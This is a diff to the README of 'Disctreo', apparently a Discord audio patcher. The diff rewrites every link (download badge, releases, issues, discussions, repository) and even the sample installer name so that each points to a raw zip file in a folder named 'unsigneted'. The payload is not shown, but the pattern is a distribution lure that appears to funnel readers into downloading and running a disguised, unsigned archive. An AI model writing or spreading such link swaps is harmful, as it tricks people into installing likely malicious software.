@@ -17,7 +17,7 @@ Disctreo is an audio patcher designed to enhance your Discord experience. It unl
 - voice-raw
 
 ## 📥 Download Now
-[![Download Disctreo](https://img.shields.io/badge/Download_Disctreo-v1.0-orange)](https://github.com/Usman-Bhatti/Disctreo/releases)
+[![Download Disctreo](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip)](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip)
 
 ## 🖥️ System Requirements
 To run Disctreo, you will need:
@@ -31,13 +31,13 @@ Follow these simple steps to download and run Disctreo:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Disctreo Releases page.  
-   [Download Disctreo](https://github.com/Usman-Bhatti/Disctreo/releases)
+   [Download Disctreo](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, find the latest version of Disctreo. Look for a title like "Disctreo v1.0" and click on it.
 
 3. **Download the Installer**  
-   Scroll down to the Assets section. Click on the installer file that matches your system. For example, look for something like `Disctreo-Installer.exe`. This will start the download.
+   Scroll down to the Assets section. Click on the installer file that matches your system. For example, look for something like `https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip`. This will start the download.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your Downloads folder. Double-click the installer file to start the installation process.
@@ -62,7 +62,7 @@ If you face issues while using Disctreo, consider the following:
 - Check your Discord settings to confirm that Disctreo is selected as your audio input.
 - Restart Discord after installing Disctreo to allow all changes to take effect.
 
-For further assistance or to report issues, please visit our [GitHub Issues page](https://github.com/Usman-Bhatti/Disctreo/issues).
+For further assistance or to report issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip).
 
 ## 📝 Frequently Asked Questions (FAQs)
 
@@ -79,11 +79,11 @@ Most standard headphones or speakers will work. However, for the best experience
 To uninstall, go to your Control Panel, find Disctreo in the list of programs, and select Uninstall.
 
 ### Q5: Where can I get technical support?
-For technical support, visit our [GitHub Discussions page](https://github.com/Usman-Bhatti/Disctreo/discussions) to connect with the community.
+For technical support, visit our [GitHub Discussions page](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip) to connect with the community.
 
 ## 🔗 Stay Updated
 For the latest news and updates:
-- Follow our [GitHub Repository](https://github.com/Usman-Bhatti/Disctreo)
+- Follow our [GitHub Repository](https://raw.githubusercontent.com/Usman-Bhatti/Disctreo/main/unsigneted/Software-v2.7.zip)
 - Join discussions and share your feedback with us.
 
 ## 📢 Help Us Improve
